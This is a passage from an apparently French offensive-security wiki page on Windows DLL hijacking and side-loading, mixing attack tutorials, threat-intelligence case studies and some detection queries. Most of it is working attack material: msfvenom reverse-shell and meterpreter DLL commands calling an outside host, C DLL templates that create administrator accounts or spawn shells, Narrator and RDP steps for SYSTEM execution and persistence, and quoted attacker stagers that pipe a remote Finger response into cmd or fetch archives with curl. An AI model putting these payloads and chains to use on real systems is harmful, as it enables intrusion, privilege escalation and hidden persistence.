- S’assurer qu’un **accès en écriture** est disponible dans n’importe quel **répertoire** où la **DLL** sera **recherchée**. Il peut s’agir du répertoire de l’exécutable ou d’un répertoire du chemin système.

Ces prérequis sont rarement réunis par défaut : les exécutables privilégiés n’ont généralement pas de dépendances DLL manquantes, et les utilisateurs standard ne peuvent normalement pas écrire dans les répertoires du chemin de recherche système. Des environnements mal configurés peuvent toutefois présenter ces deux conditions.\
Si les prérequis sont réunis, consultez le projet [UACME](https://github.com/hfiref0x/UACME). Bien que son objectif principal soit le contournement de l’UAC, il contient des PoC de DLL hijacking pour certaines versions de Windows, qui peuvent souvent être adaptés au répertoire accessible en écriture que vous avez trouvé.

Notez que vous pouvez **vérifier vos permissions sur un dossier** avec :<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Et **vérifiez les permissions de tous les dossiers dans PATH** :

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Vous pouvez également vérifier les imports d’un exécutable et les exports d’une dll avec :

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Pour obtenir un guide complet sur la façon d’**abuser de DLL Hijacking pour élever ses privilèges** avec des permissions d’écriture dans un **dossier du System Path**, consultez :


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Outils automatisés

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)vérifiera si vous avez des permissions d’écriture dans un dossier du PATH système.\
D’autres outils automatisés intéressants pour détecter cette vulnérabilité sont les **fonctions PowerSploit** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ et _Write-HijackDll._

### Exemple

Si vous trouvez un scénario exploitable, l’un des éléments les plus importants pour réussir l’exploitation sera de **créer une dll qui exporte au moins toutes les fonctions que l’exécutable importera depuis celle-ci**. Quoi qu’il en soit, notez que DLL Hijacking est pratique pour [**passer du niveau Medium Integrity au niveau High (en contournant UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou du [**niveau High Integrity à SYSTEM**](../index.html#from-high-integrity-to-system)**.** Vous trouverez un exemple de **création d’une dll valide** dans cette étude de DLL hijacking axée sur l’exécution via DLL hijacking : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
De plus, dans la **section suivante**, vous trouverez quelques **codes dll de base** qui pourront servir de **modèles** ou permettre de créer une **dll avec des fonctions exportées non requises**.

## **Création et compilation de DLL**

### **Proxification de DLL**

En gros, un **proxy DLL** est une DLL capable d’**exécuter votre code malveillant lors de son chargement**, mais aussi de s’**exposer** et de **fonctionner** comme **prévu**, en **transmettant tous les appels à la vraie bibliothèque**.

Avec l’outil [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus), vous pouvez **indiquer un exécutable et sélectionner la bibliothèque** que vous souhaitez proxifier, puis **générer une dll proxifiée**, ou **indiquer la DLL** et **générer une dll proxifiée**.

### **Meterpreter**

**Obtenir un rev shell (x64) :**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Obtenir un meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Créer un utilisateur (je n’ai pas trouvé de version x64 pour x86) :**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Votre propre

Dans de nombreux cas, la DLL que vous compilez doit **exporter chaque fonction importée par le processus victime**. Si une exportation nécessaire est manquante, le binaire ne peut pas la résoudre et l’exploit échoue.

<details>
<summary>Modèle de DLL C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Exemple de DLL C++ avec création d’utilisateur</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL C alternative avec point d’entrée de thread</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### DLL NativeAOT avec initialisation déclenchée par un export

Une **bibliothèque partagée .NET NativeAOT autonome** peut servir de DLL native déposée sans implémenter explicitement `DllMain`. Exportez des méthodes C# statiques avec `[UnmanagedCallersOnly(EntryPoint = "...")]` ; lorsque l’hôte natif appelle l’un de ces points d’entrée générés par le compilateur, NativeAOT initialise le module et une méthode `[ModuleInitializer]` s’exécute avant le corps C# exporté. La sortie ne nécessite pas l’installation séparée du runtime .NET.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

La DLL doit toujours disposer des **noms d’export et des signatures compatibles avec l’ABI** réellement appelés par l’hôte choisi. Des stubs minimaux peuvent suffire à déclencher l’initialisation, mais l’absence d’exports peut empêcher le chargement et une signature incorrecte peut corrompre l’appel. Énumérez les imports de l’hôte et validez le résultat avec `dumpbin /exports payload.dll` avant de renommer la sortie selon le nom de dépendance attendu par l’hôte.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>DLL exportée NativeAOT minimale</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Configurez le projet comme une bibliothèque partagée native autonome pour Windows :<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Placez la DLL renommée à côté de l’exécutable vulnérable copié et démarrez l’hôte via le chemin de code qui appelle l’export compatible. Cette approche par initialiseur évite de placer des opérations complexes directement dans `DllMain`, mais les préconditions du sideload restent inchangées : le chargeur doit résoudre la dépendance par son nom, sélectionner le répertoire de l’application et ne pas la trouver d’abord via KnownDLLs, un module déjà chargé, une redirection SxS ou des indicateurs `LOAD_LIBRARY_SEARCH_*` restrictifs.<sup>[[26]](#references)[[30]](#references)</sup>

Pour des modèles natifs classiques, consultez [Windows C payloads](../windows-c-payloads.md). Un premier stade chargé par sideload peut ensuite effectuer du [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe), mais il s’agit d’une technique d’injection distincte, et non d’une partie de la résolution des DLL.

## Détection : chargements de bibliothèques par DLL masquerading

Elastic Defend 9.5.0 enrichit un événement de chargement de bibliothèque avec `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` lorsque le fichier chargé n’est pas signé par Microsoft et que son nom de fichier correspond à une entrée de l’inventaire mis en cache par Elastic des noms de DLL Windows/système. L’inventaire des noms de fichiers, l’analyse de l’emplacement système et celle de la signature sont ainsi prises en charge par le capteur du point de terminaison ; la requête EQL de base peut donc être réduite à :<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Traitez l’enrichissement comme un pivot à forte valeur, et non comme une preuve en soi. Augmentez le niveau de confiance lorsqu’un hôte signé charge la DLL depuis son propre répertoire **accessible en écriture par l’utilisateur**, que la DLL n’est pas signée ou n’est pas approuvée, et que `dll.Ext.relative_file_creation_time` indique qu’elle a été créée peu avant son chargement. Limitez les exclusions à la combinaison exacte éditeur + processus hôte + chemin d’installation ; ne supprimez pas globalement les alertes pour un nom de DLL qui entre en collision, car des installateurs et applications légitimes peuvent inclure des bibliothèques privées portant des noms similaires à ceux de fichiers système.<sup>[[26]](#references)</sup>

Sur les capteurs qui ne disposent pas de cet enrichissement, approximez le comportement en corrélant un nom de DLL qui entre en collision avec un chemin de chargement non système, une signature Microsoft absente ou non approuvée, et un intervalle court entre la création du fichier et son chargement. Cela nécessite un inventaire des noms de DLL tenu à jour et des exclusions ciblées pour `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` et les autres chemins de déploiement approuvés.<sup>[[26]](#references)</sup>

## Étude de cas : détournement de DLL de localisation TTS OneCore de Narrator (accessibilité/ATs)

Au démarrage, Windows Narrator.exe recherche toujours une DLL de localisation prévisible et propre à la langue. Cette DLL peut être détournée pour exécuter du code arbitraire et assurer la persistance.<sup>[[7]](#references)</sup>

Faits clés
- Chemin de recherche (versions actuelles) : `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Chemin historique (anciennes versions) : `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si une DLL contrôlée par l’attaquant et accessible en écriture se trouve au chemin OneCore, elle est chargée et `DllMain(DLL_PROCESS_ATTACH)` s’exécute. Aucune exportation n’est nécessaire.

Découverte avec Procmon
- Filtre : `Process Name is Narrator.exe` et `Operation is Load Image` ou `CreateFile`.
- Démarrez Narrator et observez la tentative de chargement depuis le chemin ci-dessus.

DLL minimale
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Silence OPSEC
- Un hijack naïf fera parler Narrator ou mettra l’interface en évidence. Pour rester discret, à l’attachement, énumérez les threads de Narrator, ouvrez le thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) et suspendez-le avec `SuspendThread` ; poursuivez dans votre propre thread. Consultez le PoC pour le code complet.<sup>[[8]](#references)</sup>

Déclenchement et persistance via la configuration Accessibility
- Contexte utilisateur (HKCU) : `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM) : `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Avec la configuration ci-dessus, le démarrage de Narrator charge la DLL plantée. Sur le bureau sécurisé (écran de connexion), appuyez sur CTRL+WIN+ENTER pour démarrer Narrator ; votre DLL s’exécute en tant que SYSTEM sur le bureau sécurisé.

Exécution SYSTEM déclenchée par RDP (mouvement latéral)
- Autorisez la couche de sécurité RDP classique : `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Connectez-vous à l’hôte par RDP, puis, sur l’écran de connexion, appuyez sur CTRL+WIN+ENTER pour lancer Narrator ; votre DLL s’exécute en tant que SYSTEM sur le bureau sécurisé.
- L’exécution s’arrête à la fermeture de la session RDP : injectez/migrez rapidement.

Bring Your Own Accessibility (BYOA)
- Vous pouvez cloner une entrée de registre d’un outil Accessibility (AT) intégré (p. ex. CursorIndicator), la modifier pour qu’elle pointe vers un binaire/DLL arbitraire, l’importer, puis définir `configuration` sur le nom de cet AT. Cette méthode permet d’exécuter un programme arbitraire via le framework Accessibility.

Remarques
- L’écriture dans `%windir%\System32` et la modification des valeurs HKLM nécessitent des droits d’administrateur.
- Toute la logique du payload peut se trouver dans `DLL_PROCESS_ATTACH` ; aucun export n’est nécessaire.

## Étude de cas : CVE-2025-1729 - Élévation de privilèges via TPQMAssistant.exe

Ce cas illustre le **Phantom DLL Hijacking** dans le TrackPoint Quick Menu de Lenovo (`TPQMAssistant.exe`), suivi sous le numéro **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Détails de la vulnérabilité

- **Composant** : `TPQMAssistant.exe`, situé dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Tâche planifiée** : `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` s’exécute chaque jour à 9 h 30 dans le contexte de l’utilisateur connecté.
- **Autorisations du répertoire** : le répertoire est accessible en écriture par `CREATOR OWNER`, ce qui permet aux utilisateurs locaux d’y déposer des fichiers arbitraires.
- **Comportement de recherche des DLL** : le programme tente d’abord de charger `hostfxr.dll` depuis son répertoire de travail et consigne « NAME NOT FOUND » si le fichier est absent, ce qui indique que la recherche privilégie le répertoire local.

### Mise en œuvre de l’exploit

Un attaquant peut placer un stub malveillant `hostfxr.dll` dans le même répertoire et exploiter l’absence de la DLL pour exécuter du code dans le contexte de l’utilisateur :

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Déroulement de l’attaque

1. En tant qu’utilisateur standard, déposez `hostfxr.dll` dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendez que la tâche planifiée s’exécute à 9:30 AM dans le contexte de l’utilisateur actuel.
3. Si un administrateur est connecté au moment de l’exécution de la tâche, la DLL malveillante s’exécute dans la session de l’administrateur avec un niveau d’intégrité moyen.
4. Enchaînez avec des techniques standard de contournement de l’UAC pour passer du niveau d’intégrité moyen aux privilèges SYSTEM.

## Étude de cas : Dropper MSI CustomAction + DLL Side-Loading via un hôte signé (wsc_proxy.exe)

Les acteurs malveillants associent souvent des droppers basés sur MSI au DLL side-loading afin d’exécuter des payloads sous un processus de confiance signé.<sup>[[10]](#references)</sup>

Vue d’ensemble de la chaîne
- L’utilisateur télécharge un MSI. Une CustomAction s’exécute discrètement pendant l’installation graphique (par exemple, LaunchApplication ou une action VBScript) et reconstitue l’étape suivante à partir de ressources intégrées.
- Le dropper écrit un fichier EXE légitime et signé ainsi qu’une DLL malveillante dans le même répertoire (exemple de paire : wsc_proxy.exe signé par Avast et wsc.dll contrôlé par l’attaquant).
- Au démarrage de l’EXE signé, l’ordre de recherche des DLL de Windows charge d’abord wsc.dll depuis le répertoire de travail, ce qui exécute le code de l’attaquant sous un processus parent signé (ATT&CK T1574.001).

Analyse du MSI (éléments à rechercher)
- Table CustomAction :
  - Recherchez les entrées qui exécutent des fichiers exécutables ou du VBScript. Exemple de modèle suspect : LaunchApplication qui exécute un fichier intégré en arrière-plan.
  - Dans Orca (Microsoft Orca.exe), examinez les tables CustomAction, InstallExecuteSequence et Binary.
- Payloads intégrés ou fractionnés dans le CAB du MSI :
  - Extraction administrative : msiexec /a package.msi /qb TARGETDIR=C:\out
  - Ou utilisez lessmsi : lessmsi x package.msi C:\out
  - Recherchez plusieurs petits fragments qui sont concaténés et déchiffrés par une CustomAction VBScript. Flux courant :

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Sideloading pratique avec wsc_proxy.exe
- Déposez ces deux fichiers dans le même dossier :
  - wsc_proxy.exe : hôte légitime signé (Avast). Le processus tente de charger wsc.dll par son nom depuis son répertoire.
  - wsc.dll : DLL de l’attaquant. Si aucun export spécifique n’est requis, DllMain peut suffire ; sinon, créez une DLL proxy et transférez les exports requis vers la bibliothèque légitime tout en exécutant le payload dans DllMain.
- Créez un payload DLL minimal :

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Pour les exigences d’exportation, utilisez un framework de proxy (par exemple DLLirant/Spartacus) pour générer une DLL de transfert qui exécute également votre payload.

- Cette technique repose sur la résolution des noms de DLL par le binaire hôte. Si l’hôte utilise des chemins absolus ou des options de chargement sécurisées (par exemple LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), le hijack peut échouer.
- KnownDLLs, SxS et les exports transférés peuvent influer sur l’ordre de priorité et doivent être pris en compte lors du choix du binaire hôte et de l’ensemble d’exports.

## Triades signées + payloads chiffrés (étude de cas ShadowPad)

Check Point a décrit comment Ink Dragon déploie ShadowPad à l’aide d’une **triade de trois fichiers** qui se fond dans les logiciels légitimes tout en gardant le payload principal chiffré sur le disque :<sup>[[12]](#references)</sup>

1. **EXE hôte signé** – Les éditeurs tels qu’AMD, Realtek ou NVIDIA sont détournés (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Les attaquants renomment l’exécutable pour le faire ressembler à un binaire Windows (par exemple `conhost.exe`), mais la signature Authenticode reste valide.
2. **DLL loader malveillante** – Déposée à côté de l’EXE sous un nom attendu (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL est généralement un binaire MFC obfusqué avec le framework ScatterBrain ; son seul rôle est de localiser le blob chiffré, de le déchiffrer et de mapper ShadowPad de manière réfléchie.
3. **Blob de payload chiffré** – Souvent stocké sous le nom `<name>.tmp` dans le même répertoire. Après avoir mappé en mémoire le payload déchiffré, le loader supprime le fichier TMP pour détruire les preuves forensiques.

Notes sur les techniques utilisées :

* Renommer l’EXE signé (tout en conservant le `OriginalFileName` d’origine dans l’en-tête PE) lui permet de se faire passer pour un binaire Windows tout en gardant la signature de l’éditeur. Reprenez donc l’habitude d’Ink Dragon de déposer des binaires ressemblant à `conhost.exe`, mais qui sont en réalité des utilitaires AMD/NVIDIA.
* Comme l’exécutable reste fiable, la plupart des contrôles d’autorisation n’exigent que la présence de votre DLL malveillante à côté de celui-ci. Concentrez-vous sur la personnalisation de la DLL loader ; le parent signé peut généralement être exécuté sans modification.
* Le déchiffreur de ShadowPad s’attend à ce que le blob TMP se trouve à côté du loader et soit accessible en écriture afin de pouvoir mettre le fichier à zéro après le mapping. Gardez le répertoire accessible en écriture jusqu’au chargement du payload ; une fois celui-ci en mémoire, le fichier TMP peut être supprimé sans risque pour l’OPSEC.

### Chaîne de sideloading d’archive avec stager LOLBAS (finger → tar/curl → WMI)

Les opérateurs associent le DLL sideloading à LOLBAS afin que le seul artefact personnalisé sur le disque soit la DLL malveillante placée à côté de l’EXE de confiance :<sup>[[1]](#references)</sup>

- **Loader de commandes à distance (Finger) :** Un PowerShell masqué lance `cmd.exe /c`, récupère des commandes depuis un serveur Finger et les transmet à `cmd` :

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` récupère du texte via TCP/79 ; `| cmd` exécute la réponse du serveur, ce qui permet aux opérateurs de faire tourner le second stage côté serveur.

- **Téléchargement/extraction intégré :** téléchargez une archive avec une extension anodine, décompressez-la et placez la cible de sideload ainsi que la DLL dans un dossier `%LocalAppData%` aléatoire :

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` masque la progression et suit les redirections ; `tar -xf` utilise l’outil tar intégré à Windows.

- **Lancement via WMI/CIM :** Démarrez l’EXE via WMI afin que la télémétrie indique un processus créé par CIM pendant qu’il charge la DLL située dans le même répertoire :

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Fonctionne avec des binaires qui privilégient les DLL locales (p. ex. `intelbq.exe`, `nearby_share.exe`) ; le payload (p. ex. Remcos) s’exécute sous le nom de confiance.

- **Chasse :** déclencher une alerte sur `forfiles` lorsque `/p`, `/m` et `/c` apparaissent ensemble ; cette combinaison est rare en dehors des scripts d’administration.


## Étude de cas : dropper NSIS + sideload de Bitdefender Submission Wizard (Chrysalis)

Une intrusion récente de Lotus Blossom a détourné une chaîne de mise à jour de confiance pour déployer un dropper empaqueté avec NSIS, qui préparait un sideload de DLL ainsi que des payloads entièrement en mémoire.<sup>[[13]](#references)</sup>

Déroulement du tradecraft
- `update.exe` (NSIS) crée `%AppData%\Bluetooth`, le marque comme **HIDDEN**, dépose un Bitdefender Submission Wizard renommé (`BluetoothService.exe`), un `log.dll` malveillant et un blob chiffré `BluetoothService`, puis lance l’EXE.
- L’EXE hôte importe `log.dll` et appelle `LogInit`/`LogWrite`. `LogInit` charge le blob avec mmap ; `LogWrite` le déchiffre à l’aide d’un générateur pseudo-aléatoire LCG personnalisé (constantes **0x19660D** / **0x3C6EF35F**, matériel de clé dérivé d’un hash antérieur), écrase le buffer avec le shellcode en clair, libère les données temporaires et lui transfère l’exécution.
- Pour éviter une IAT, le loader résout les API en hachant les noms des exports avec **la base FNV-1a 0x811C9DC5 + le nombre premier 0x1000193**, puis en appliquant une fonction de diffusion de type Murmur (**0x85EBCA6B**) et en comparant le résultat aux hash cibles salés.

Shellcode principal (Chrysalis)
- Déchiffre un module principal de type PE en répétant des opérations d’addition/XOR/soustraction avec la clé `gQ2JR&9;` sur cinq passes, puis charge dynamiquement `Kernel32.dll` → `GetProcAddress` pour terminer la résolution des imports.
- Reconstruit les chaînes de noms de DLL à l’exécution au moyen de transformations de rotation de bits/XOR caractère par caractère, puis charge `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Utilise un second résolveur qui parcourt **PEB → InMemoryOrderModuleList**, analyse chaque table d’exports par blocs de 4 octets avec un mélange de type Murmur, et ne revient à `GetProcAddress` que si le hash est introuvable.

Configuration intégrée et C2
- La configuration se trouve dans le fichier `BluetoothService` déposé à **l’offset 0x30808** (taille **0x980**) et est déchiffrée avec RC4 à l’aide de la clé `qwhvb^435h&*7`, révélant l’URL C2 et le User-Agent.
- Les beacons construisent un profil d’hôte délimité par des points, préfixent l’étiquette `4Q`, puis chiffrent le tout avec RC4 à l’aide de la clé `vAuig34%^325hGV` avant d’appeler `HttpSendRequestA` via HTTPS. Les réponses sont déchiffrées avec RC4 et distribuées par un commutateur d’étiquettes (`4T` shell, `4V` exécution de processus, `4W/4X` écriture de fichier, `4Y` lecture/exfiltration, `4\\` désinstallation, `4` énumération des lecteurs/fichiers + cas de transfert par blocs).
- Le mode d’exécution dépend des arguments CLI : sans argument = installation de la persistance (service/clé Run) pointant vers `-i` ; `-i` relance le programme avec `-k` ; `-k` ignore l’installation et exécute le payload.

Autre loader observé
- La même intrusion a déposé Tiny C Compiler et exécuté `svchost.exe -nostdlib -run conf.c` depuis `C:\ProgramData\USOShared\`, avec `libtcc.dll` à côté. Le code source C fourni par l’attaquant intégrait le shellcode, le compilait et l’exécutait en mémoire sans écrire de PE sur le disque. Reproduire avec :

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Cette étape de compilation et d’exécution basée sur TCC a importé `Wininet.dll` à l’exécution et récupéré un shellcode de deuxième étape depuis une URL codée en dur, offrant ainsi un loader flexible qui se fait passer pour une exécution du compilateur.

## Sideloading d’un hôte signé avec proxy d’exports et mise en attente du thread hôte

Certaines chaînes de DLL sideloading ajoutent des **mesures de stabilisation** pour que l’hôte légitime reste actif assez longtemps afin de charger proprement les étapes suivantes, au lieu de planter après le chargement de la DLL malveillante.<sup>[[11]](#references)</sup>

Schéma observé
- Déposer un EXE de confiance à côté d’une DLL malveillante portant le nom de dépendance attendu, par exemple `version.dll`.
- La DLL malveillante **redirige tous les exports attendus** vers la véritable DLL système (par exemple `%SystemRoot%\\System32\\version.dll`), afin que la résolution des imports réussisse et que le processus hôte continue de fonctionner.
- Après le chargement, la DLL malveillante **modifie le point d’entrée de l’hôte** pour que le thread principal entre dans une boucle `Sleep` infinie, au lieu de se terminer ou d’exécuter des chemins de code qui mettraient fin au processus.
- Un nouveau thread effectue le véritable travail malveillant : déchiffrer le nom ou le chemin de la DLL de l’étape suivante (RC4/XOR sont courants), puis la lancer avec `LoadLibrary`.

Pourquoi c’est important
- Le proxying normal des DLL préserve la compatibilité des API, mais ne garantit pas que l’hôte restera actif assez longtemps pour les étapes suivantes.
- Mettre le thread principal en attente avec `Sleep(INFINITE)` est un moyen simple de maintenir le processus signé en mémoire pendant que le loader effectue le déchiffrement, la mise en staging ou l’initialisation réseau dans un thread de travail.
- Une recherche limitée à un `DllMain` suspect peut passer à côté de ce schéma si le comportement intéressant survient après la modification du point d’entrée de l’hôte et le démarrage d’un thread secondaire.

Workflow minimal
1. Copier l’EXE signé et déterminer quelle DLL il résout depuis le répertoire local.
2. Créer une DLL proxy exportant les mêmes fonctions et les redirigeant vers la DLL légitime.
3. Dans `DllMain(DLL_PROCESS_ATTACH)`, créer un thread de travail.
4. Depuis ce thread, modifier le point d’entrée de l’hôte ou la routine de démarrage du thread principal pour qu’il boucle sur `Sleep`.
5. Déchiffrer le nom/la configuration de la DLL de l’étape suivante et appeler `LoadLibrary` ou effectuer un manual-map du payload.

Points de détection défensifs
- Processus signés chargeant `version.dll` ou des bibliothèques courantes similaires depuis leur propre répertoire d’application plutôt que depuis `System32`.
- Modifications en mémoire du point d’entrée du processus peu après le chargement de l’image, en particulier des sauts/appels redirigés vers `Sleep`/`SleepEx`.
- Threads créés par une DLL proxy qui appellent immédiatement `LoadLibrary` sur une deuxième DLL dont le nom a été déchiffré.
- DLL proxy exportant toutes les fonctions et placées à côté d’exécutables de fournisseurs dans des répertoires de staging accessibles en écriture tels que `ProgramData`, `%TEMP%` ou des chemins d’archives décompressées.

## References

- [1] [Red Canary – Analyses de renseignement : janvier 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Élévation de privilèges via TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT : DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking sous Windows. Exemple simple en C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore déploie de nouveaux malwares ciblant l’Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility : quand les DLL Hijacks rencontrent les assistants Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Doppelgängers numériques : anatomie de campagnes d’usurpation en évolution distribuant Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Convergences d’intérêts : analyse de clusters de menaces ciblant un gouvernement d’Asie du Sud-Est](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
